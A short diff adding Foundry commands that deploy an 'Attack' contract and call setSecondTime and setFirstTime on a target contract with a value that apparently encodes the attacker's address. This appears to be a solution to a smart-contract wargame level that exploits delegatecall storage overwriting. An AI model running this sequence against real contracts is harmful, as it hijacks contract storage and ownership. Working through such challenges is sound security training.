@@ -1,0 +1,3 @@
+forge create --rpc-url $URL_PROD --private-key $PRI_KEY_PROD Attack
+cast send -f $USER_PROD --rpc-url $URL_PROD --private-key $PRI_KEY_PROD $CONTRACT_PROD "setSecondTime(uint)" "1365266589747844082516625825714253476399254921866"
+cast send -f $USER_PROD --rpc-url $URL_PROD --private-key $PRI_KEY_PROD $CONTRACT_PROD "setFirstTime(uint)" "1365266589747844082516625825714253476399254921866"
